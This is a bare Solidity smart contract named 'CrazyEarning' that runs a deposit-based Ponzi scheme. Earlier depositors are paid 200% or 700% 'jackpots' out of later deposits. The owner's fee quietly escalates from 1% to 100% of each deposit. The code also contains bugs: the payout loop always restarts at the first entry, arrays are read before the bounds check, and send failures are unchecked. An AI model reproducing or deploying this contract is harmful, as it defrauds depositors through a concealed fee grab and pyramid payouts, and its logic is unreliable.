 

 
 
 
 
 
 
 
 
 
 
 
 
contract CrazyEarning{
struct earnerarray{
address etherAddress;
uint amount;
}
earnerarray[] public crazyearners;
uint public deposits_until_jackpot=0;
uint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;
address public owner; modifier onlyowner{if(msg.sender==owner)_}
function CrazyEarning(){
owner=msg.sender;
}
function(){
enter();
}
function enter(){
if(msg.value<400 finney){
return;
}
uint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;
deposits_until_jackpot=20-(totalearners%20);
crazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;
crazyearners[tot_pl].amount=amount;
feeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;
if(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;
totalmoneyearned+=feeamount;if(alpha<100)alpha+=30;
else alpha=100;}} uint payout;uint nr=0;


while(balance>crazyearners[nr].amount*200/100 && nr<tot_pl)
{
if(nr%10==0&&balance>crazyearners[nr].amount*700/100)
{
payout=crazyearners[nr].amount*700/100;
crazyearners[nr].etherAddress.send(payout);
balance-=crazyearners[nr].amount*700/100;
totalmoneyearned+=crazyearners[nr].amount*700/100;
}
else
{
payout=crazyearners[nr].amount*200/100;
crazyearners[nr].etherAddress.send(payout);
balance-=crazyearners[nr].amount*200/100;
totalmoneyearned+=crazyearners[nr].amount*200/100;
}
nr+=1;
}}}